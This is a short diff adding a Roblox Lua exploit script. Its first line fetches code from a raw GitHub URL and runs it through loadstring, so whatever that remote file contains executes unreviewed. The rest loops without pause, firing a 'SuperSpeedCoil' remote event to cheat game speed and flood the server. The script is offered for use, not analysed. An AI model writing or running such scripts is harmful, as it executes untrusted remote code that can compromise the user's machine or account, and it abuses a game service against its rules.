@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZNX-GHAZITAB/ZnxOfficial/refs/heads/main/Safe"))()
+
+local args = {
+    [1] = 16
+}
+
+while true do
+    game:GetService("Players").LocalPlayer.Character.SuperSpeedCoil.Speed:FireServer(unpack(args))
+    task.wait() -- you can change this to a lower value like `task.wait(0.01)` to control spam speed
+end
